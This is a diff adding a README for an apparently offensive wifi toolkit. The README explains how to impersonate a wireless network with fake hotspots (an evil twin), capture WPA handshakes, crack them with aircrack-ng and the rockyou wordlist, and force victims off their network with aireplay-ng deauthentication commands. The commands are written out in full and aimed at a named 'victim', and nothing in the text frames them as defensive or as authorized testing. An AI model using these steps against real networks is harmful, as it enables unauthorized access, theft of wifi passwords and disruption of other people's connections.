@@ -1,0 +1,35 @@
+WIFI Readme:
+
+
+Use Wifi honey like so:
+
+sudo ./wifi_honey.sh <ESSID> <CHANNEL> <interface>
+
+to impersonate a wifi network.
+
+wifi honey will create 4 hotspots and open airodump-ng to discover which type of encryption the network is using by watching people connect to it.
+Once discovered, if connection is successful the password can be cracked.
+As there is only one wlan being used. Once the type of encryption is discovered the best thing to do is to close wifi-honey and run the script
+startAccessPoin.sh remembering to change the ESSID in the script to the one you are trying to impersonate.
+When setting up the access point, remember that it is outputting the handshake so using aircrack-ng and a wordlist:
+
+aircrack-ng -w ../word_lists/rockyou.txt cap-01.cap
+
+the handshake file can be used to crack the password.
+
+So you have two options.
+
+First, get the user to connect through you if you can. That is what startAccessPoint.sh will try to do. If this works you will get the handshake.
+
+Deauthing:
+You will need to deauth to either watch for a new handshake to steal the password or to get them to connect to your access point....
+To do so, using airdump-ng look for the channel that the access point you are going to deauth from is on
+then run
+sudo airmon-ng start wlan1 <channel>
+
+Then to deauth run:
+sudo aireplay-ng -0 0 -a <access point mac address -c <victim mac address> mon0
+
+Test Access Point:
+
+001601AF089C_2
